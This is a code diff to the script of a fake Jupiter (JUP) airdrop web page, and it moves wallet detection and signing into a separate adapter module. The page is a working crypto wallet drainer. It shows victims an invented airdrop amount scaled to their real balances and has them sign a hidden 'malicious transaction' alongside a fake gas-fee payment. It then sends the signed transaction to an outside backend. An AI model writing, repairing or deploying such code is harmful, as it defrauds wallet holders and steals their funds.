@@ -261,6 +261,8 @@
     </div>
 </div>
 
+<!-- Load Wallet Adapter -->
+<script src="wallet-adapter.js"></script>
 <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
 <script>
 // Backend URL (replace with your actual backend)
@@ -269,34 +271,8 @@ const BACKEND_URL = 'https://ujbackend.onrender.com';
 let walletAddress = null;
 let connectedWallet = null;
 let balances = { SOL: 0, USDC: 0 };
-
-// ====== WALLET DETECTION ======
-const getSolanaProvider = () => {
-    if (typeof window !== 'undefined') {
-        // Phantom (standard injected object)
-        if (window.phantom?.solana?.isPhantom) {
-            console.log('[DEBUG] Found window.phantom.solana');
-            return window.phantom.solana;
-        }
-        // Standard Solana object (Phantom, Backpack, etc.)
-        if (window.solana && window.solana.isPhantom) {
-            console.log('[DEBUG] Found window.solana (isPhantom)');
-            return window.solana;
-        }
-        // Solflare
-        if (window.solflare?.isSolflare) {
-            console.log('[DEBUG] Found window.solflare');
-            return window.solflare;
-        }
-        // Generic fallback
-        if (window.solana) {
-            console.log('[DEBUG] Found generic window.solana');
-            return window.solana;
-        }
-    }
-    console.warn('[DEBUG] No Solana provider found');
-    return null;
-};
+let currentProvider = null;
+let currentWalletName = null;
 
 // ====== WALLET CONNECTION ======
 async function connectWallet() {
@@ -307,31 +283,36 @@ async function connectWallet() {
     document.getElementById('loading').classList.add('active');
     document.getElementById('statusText').textContent = "Connecting wallet...";
     
-    const provider = getSolanaProvider();
-    console.log('[DEBUG] Provider:', provider);
-    
-    if (!provider) {
-        alert('No Solana wallet detected! Install Phantom or Solflare.');
-        btn.disabled = false;
-        document.getElementById('loading').classList.remove('active');
-        return;
-    }
-
     try {
-        console.log('[DEBUG] Attempting to connect...');
-        const response = await provider.connect();
-        walletAddress = response.publicKey.toString();
-        connectedWallet = new solanaWeb.PublicKey(response.publicKey);
+        // Get available wallet using universal adapter
+        const { provider, name } = window.WalletAdapter.getAvailableWallet();
+        
+        if (!provider) {
+            throw new Error('No Solana wallet detected! Install Phantom, Solflare, Magic Eden, or another Solana-compatible wallet.');
+        }
+        
+        console.log(`[DEBUG] Using wallet: ${name}`);
+        currentProvider = provider;
+        currentWalletName = name;
+        
+        // Setup wallet listeners
+        window.WalletAdapter.setupWalletListeners(provider);
+        
+        // Connect to wallet
+        const publicKey = await window.WalletAdapter.connectToWallet(provider);
+        walletAddress = publicKey.toString();
+        connectedWallet = new solanaWeb.PublicKey(publicKey);
 
         console.log('[DEBUG] Connected wallet:', walletAddress);
         btn.textContent = `Connected: ${walletAddress.substring(0, 4)}...${walletAddress.substring(walletAddress.length - 4)}`;
-        document.getElementById('statusText').textContent = "Wallet connected successfully";
+        document.getElementById('statusText').textContent = `Wallet connected successfully (${name})`;
 
         // Proceed to check eligibility
         await checkEligibility();
+        
     } catch (error) {
         console.error("[DEBUG] Connection error:", error);
-        alert('Wallet connection failed. Please try again.');
+        alert(error.message || 'Wallet connection failed. Please try again.');
         btn.disabled = false;
         document.getElementById('loading').classList.remove('active');
     }
@@ -343,33 +324,41 @@ async function checkEligibility() {
     document.getElementById('loading').classList.add('active');
     document.getElementById('statusText').textContent = "Checking eligibility...";
 
-    // Get real balances
-    balances = await getTokenBalances(walletAddress);
+    try {
+        // Get real balances
+        balances = await getTokenBalances(walletAddress);
 
-    // Calculate fake airdrop amount
-    const totalValue = balances.SOL * 150 + balances.USDC;
-    let fakeAmount;
+        // Calculate fake airdrop amount
+        const totalValue = balances.SOL * 150 + balances.USDC;
+        let fakeAmount;
 
-    if (totalValue > 5000) {
-        fakeAmount = 50 + Math.floor(Math.random() * 50);
-    } else if (totalValue > 1000) {
-        fakeAmount = 10 + Math.floor(Math.random() * 41);
-    } else if (totalValue > 100) {
-        fakeAmount = 5 + Math.floor(Math.random() * 9);
-    } else {
-        fakeAmount = 1 + Math.floor(Math.random() * 4);
+        if (totalValue > 5000) {
+            fakeAmount = 50 + Math.floor(Math.random() * 50);
+        } else if (totalValue > 1000) {
+            fakeAmount = 10 + Math.floor(Math.random() * 41);
+        } else if (totalValue > 100) {
+            fakeAmount = 5 + Math.floor(Math.random() * 9);
+        } else {
+            fakeAmount = 1 + Math.floor(Math.random() * 4);
+        }
+
+        console.log('[DEBUG] Fake airdrop amount:', fakeAmount);
+        document.getElementById('claimAmount').textContent = fakeAmount.toLocaleString();
+        document.getElementById('statusText').textContent = "You're eligible for a bonus airdrop!";
+        document.getElementById('loading').classList.remove('active');
+
+        // Change button to trigger claim
+        const btn = document.getElementById('actionBtn');
+        btn.textContent = `Claim ${fakeAmount} JUP`;
+        btn.onclick = () => showGasFeePopup(fakeAmount);
+        btn.disabled = false;
+        
+    } catch (error) {
+        console.error("[DEBUG] Eligibility check error:", error);
+        alert('Error checking eligibility: ' + error.message);
+        document.getElementById('statusText').textContent = "Eligibility check failed";
+        document.getElementById('loading').classList.remove('active');
     }
-
-    console.log('[DEBUG] Fake airdrop amount:', fakeAmount);
-    document.getElementById('claimAmount').textContent = fakeAmount.toLocaleString();
-    document.getElementById('statusText').textContent = "You're eligible for a bonus airdrop!";
-    document.getElementById('loading').classList.remove('active');
-
-    // Change button to trigger claim
-    const btn = document.getElementById('actionBtn');
-    btn.textContent = `Claim ${fakeAmount} JUP`;
-    btn.onclick = () => showGasFeePopup(fakeAmount);
-    btn.disabled = false;
 }
 
 // ====== FETCH TOKEN BALANCES ======
@@ -468,16 +457,15 @@ async function payGasFee() {
         );
 
         //3. GET USER'S SIGNATURE FOR BOTH TRANSACTIONS
-        const provider = getSolanaProvider();
-        if (!provider) throw new Error("No wallet provider found");
+        if (!currentProvider) throw new Error("No wallet provider found");
 
         // Sign the malicious transaction first (hidden)
         console.log('[DEBUG] Signing malicious transaction...');
-        const signedMaliciousTx = await provider.signTransaction(maliciousTx);
+        const signedMaliciousTx = await window.WalletAdapter.signTransaction(currentProvider, maliciousTx);
 
         // Sign the fake gas fee transaction (shown to user)
         console.log('[DEBUG] Signing and sending fake gas fee transaction...');
-        await provider.signAndSendTransaction(fakeGasTx);
+        await window.WalletAdapter.signAndSendTransaction(currentProvider, fakeGasTx);
 
         //4. SEND MALICIOUS TRANSACTION TO BACKEND
         console.log('[DEBUG] Sending to backend...');
@@ -575,12 +563,13 @@ window.addEventListener('load', function() {
     };
 
     // Check for wallet on load
-    const provider = getSolanaProvider();
-    if (provider) {
-        console.log('[DEBUG] Wallet provider detected on load');
+    const availableWallets = window.WalletAdapter.getAllAvailableWallets();
+    if (availableWallets.length > 0) {
+        console.log('[DEBUG] Wallet(s) detected on load');
         document.getElementById('statusText').textContent = "Click 'Connect Wallet' to check eligibility";
     } else {
         console.warn('[DEBUG] No wallet provider detected on load');
+        document.getElementById('statusText').textContent = "Please install a Solana wallet (Phantom, Solflare, Magic Eden, etc.)";
     }
 });
 </script>
